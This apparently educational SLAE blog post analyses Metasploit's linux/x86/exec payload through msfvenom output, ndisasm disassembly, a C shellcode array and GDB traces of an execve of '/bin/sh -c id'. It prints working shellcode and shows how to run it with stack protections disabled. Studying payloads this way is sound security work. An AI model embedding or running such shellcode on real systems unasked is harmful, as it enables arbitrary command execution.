---
layout: post
title: Metasploit Linux x86 exec Analysis
tags: [slae]
---

This is the last Metasploit payload analysis post for the SLAE. This time we'll be examining the `linux/x86/exec` payload and seeing exactly how it works. 

Like always we'll first start by checking out the payload options.

```
root@kali:~/SLAE# msfvenom -p linux/x86/exec --payload-options
Options for payload/linux/x86/exec:


       Name: Linux Execute Command
     Module: payload/linux/x86/exec
   Platform: Linux
       Arch: x86
Needs Admin: No
 Total size: 36
       Rank: Normal

Provided by:
    vlad902 <vlad902@gmail.com>

Basic options:
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
CMD                    yes       The command string to execute

Description:
  Execute an arbitrary command
``` 

To keep things simple we'll specify `id` as our CMD option. Let's run `msfvenom` and pipe into `ndisasm` to get an overview of the assembly.

```
root@kali:~/SLAE# msfvenom -p linux/x86/exec CMD=id -f raw | ndisasm -u -
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 38 bytes

00000000  6A0B              push byte +0xb
00000002  58                pop eax
00000003  99                cdq
00000004  52                push edx
00000005  66682D63          push word 0x632d
00000009  89E7              mov edi,esp
0000000B  682F736800        push dword 0x68732f
00000010  682F62696E        push dword 0x6e69622f
00000015  89E3              mov ebx,esp
00000017  52                push edx
00000018  E803000000        call 0x20
0000001D  696400575389E1CD  imul esp,[eax+eax+0x57],dword 0xcde18953
00000025  80                db 0x80
```

Another small payload. We see another CALL but can't see the instructions its calling at the address 0x20. Let's extract the shellcode and throw it in our trusty dusty C wrapper to see exactly what's happening with GDB. 

```
root@kali:~/SLAE# msfvenom -p linux/x86/exec CMD=id -f c
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 38 bytes
Final size of c file: 185 bytes
unsigned char buf[] = 
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x03\x00\x00\x00\x69"
"\x64\x00\x57\x53\x89\xe1\xcd\x80";


root@kali:~/SLAE# vim id.c
root@kali:~/SLAE# gcc id.c -o id -fno-stack-protector -z execstack
root@kali:~/SLAE# ./id
Shellcode Length:  15
uid=0(root) gid=0(root) groups=0(root)
```

Payload indeed works. We'll fire up GDB and set a breakpoint on our shellcode.

```
root@kali:~/SLAE# gdb -q ./id
Reading symbols from ./id...(no debugging symbols found)...done.
gdb-peda$ break *&code
Breakpoint 1 at 0x2040
gdb-peda$ r
Starting program: /root/SLAE/id 
Shellcode Length:  15

[----------------------------------registers-----------------------------------]
EAX: 0x402040 --> 0x99580b6a 
EBX: 0x402000 --> 0x1efc 
ECX: 0x16 
EDX: 0xb7fa4870 --> 0x0 
ESI: 0x1 
EDI: 0xb7fa3000 --> 0x1b9db0 
EBP: 0xbffff388 --> 0x0 
ESP: 0xbffff36c --> 0x40059d (<main+80>:	mov    eax,0x0)
EIP: 0x402040 --> 0x99580b6a
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40203a:	add    BYTE PTR [eax],al
   0x40203c:	add    BYTE PTR [eax],al
   0x40203e:	add    BYTE PTR [eax],al
=> 0x402040 <code>:	push   0xb
   0x402042 <code+2>:	pop    eax
   0x402043 <code+3>:	cdq    
   0x402044 <code+4>:	push   edx
   0x402045 <code+5>:	pushw  0x632d
[------------------------------------stack-------------------------------------]
0000| 0xbffff36c --> 0x40059d (<main+80>:	mov    eax,0x0)
0004| 0xbffff370 --> 0x1 
0008| 0xbffff374 --> 0xbffff434 --> 0xbffff5cc ("/root/SLAE/id")
0012| 0xbffff378 --> 0xbffff43c --> 0xbffff5da ("LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...)
0016| 0xbffff37c --> 0x402040 --> 0x99580b6a 
0020| 0xbffff380 --> 0xbffff3a0 --> 0x1 
0024| 0xbffff384 --> 0x0 
0028| 0xbffff388 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x00402040 in code ()
```

## execve()

There is only one system call for this payload so we'll be looking at all of the assembly instructions. I've made comments to help follow along on what's happening. 


```nasm
push   0xb			; execve()		
pop    eax			;
cdq    				; set edx to 0
push   edx			; 0
pushw  0x632d			; '-c'
mov    edi,esp			; point edi to stack
push   0x68732f			; '/sh'
push   0x6e69622f		; '/bin
mov    ebx,esp			; point ebx to stack
push   edx			; 0
call   0x402060 <code+32>	; call and push "id" string to stack	
imul   esp,DWORD PTR 		; "id" string
push   ebx			; push "/bin/sh"
mov    ecx,esp			; point to stack
int    0x80			; execute execve
```

Everything is pretty straight forward. We first see a PUSH of the execve() syscall (11) along with a CDQ to zero out EDX. From here is setting up the stack for execve(). The CALL trick is used once again to get our command to be ran pushed onto the stack. We can see that here after setting a breakpoint at code+32 right before the PUSH to point EBX at the stack. Previously we did not see the instructions from push EBX to the interrupt call when using `ndisasm`.

```
[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0xbffff35e ("/bin/sh")
ECX: 0x16 
EDX: 0x0 
ESI: 0x1 
EDI: 0xbffff366 --> 0x632d ('-c')
EBP: 0xbffff388 --> 0x0 
ESP: 0xbffff352 --> 0xbffff366 --> 0x632d ('-c')
EIP: 0x402061 --> 0xcde18953
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
=> 0x402061 <code+33>:	push   ebx
   0x402062 <code+34>:	mov    ecx,esp
   0x402064 <code+36>:	int    0x80
   0x402066 <code+38>:	add    BYTE PTR [eax],al
[------------------------------------stack-------------------------------------]
0000| 0xbffff352 --> 0xbffff366 --> 0x632d ('-c')
0004| 0xbffff356 --> 0x40205d --> 0x57006469 ('id')
0008| 0xbffff35a --> 0x0 
0012| 0xbffff35e ("/bin/sh")
0016| 0xbffff362 --> 0x68732f ('/sh')
0020| 0xbffff366 --> 0x632d ('-c')
0024| 0xbffff36a --> 0x59d0000 
0028| 0xbffff36e --> 0x10040 
[------------------------------------------------------------------------------]
```

Right before the interrupt is called our registers and stack looks like such:

```
[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0xbffff35e ("/bin/sh")
ECX: 0xbffff34e --> 0xbffff35e ("/bin/sh")
EDX: 0x0 
ESI: 0x1 
EDI: 0xbffff366 --> 0x632d ('-c')
EBP: 0xbffff388 --> 0x0 
ESP: 0xbffff34e --> 0xbffff35e ("/bin/sh")
EIP: 0x402064 --> 0x80cd
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40205c <code+28>:	add    BYTE PTR [ecx+0x64],ch
   0x40205f <code+31>:	add    BYTE PTR [edi+0x53],dl
   0x402062 <code+34>:	mov    ecx,esp
=> 0x402064 <code+36>:	int    0x80
   0x402066 <code+38>:	add    BYTE PTR [eax],al
   0x402068:	add    BYTE PTR [eax],al
   0x40206a:	add    BYTE PTR [eax],al
   0x40206c:	add    BYTE PTR [eax],al
[------------------------------------stack-------------------------------------]
0000| 0xbffff34e --> 0xbffff35e ("/bin/sh")
0004| 0xbffff352 --> 0xbffff366 --> 0x632d ('-c')
0008| 0xbffff356 --> 0x40205d --> 0x57006469 ('id')
0012| 0xbffff35a --> 0x0 
0016| 0xbffff35e ("/bin/sh")
0020| 0xbffff362 --> 0x68732f ('/sh')
0024| 0xbffff366 --> 0x632d ('-c')
0028| 0xbffff36a --> 0x59d0000 
[------------------------------------------------------------------------------]
```

This formats our execve call as follows:

```
execve("/bin/sh", ["/bin/sh", '-c' 'id'], 0)
```

That's it! Only one syscall to dissect this time around. 

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/>

Student ID: SLAE-1208

Github Repo: <https://github.com/absolomb/SLAE>